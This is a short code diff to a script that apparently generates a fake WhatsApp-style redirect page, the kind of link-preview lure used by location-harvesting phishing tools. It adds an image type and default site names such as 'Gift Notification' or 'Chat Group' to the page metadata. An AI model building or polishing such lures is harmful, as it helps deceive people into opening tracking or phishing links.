@@ -73,6 +73,9 @@ if image.startswith('http'):
 else:
     og_image = f'https://seeker.riocut.com/images/{img_name}'
 
+img_type = 'image/png' if ((img_name and img_name.lower().endswith('.png')) or image.lower().endswith('.png')) else 'image/jpeg'
+site_name = os.getenv('SITENAME') or ('Gift Notification' if 'gift' in title.lower() else 'Chat Group')
+
 with open('template/whatsapp_redirect/index_temp.html', 'r') as index_temp:
     code = index_temp.read()
     if os.getenv("DEBUG_HTTP"):
@@ -80,6 +83,8 @@ with open('template/whatsapp_redirect/index_temp.html', 'r') as index_temp:
     code = code.replace('$TITLE$', title)
     code = code.replace('$DESC$', desc)
     code = code.replace('$OG_IMAGE$', og_image)
+    code = code.replace('$OG_IMAGE_TYPE$', img_type)
+    code = code.replace('$SITE_NAME$', site_name)
     code = code.replace('REDIRECT_URL', redirect)
     code = code.replace('$IMAGE$', 'images/{}'.format(img_name))
 
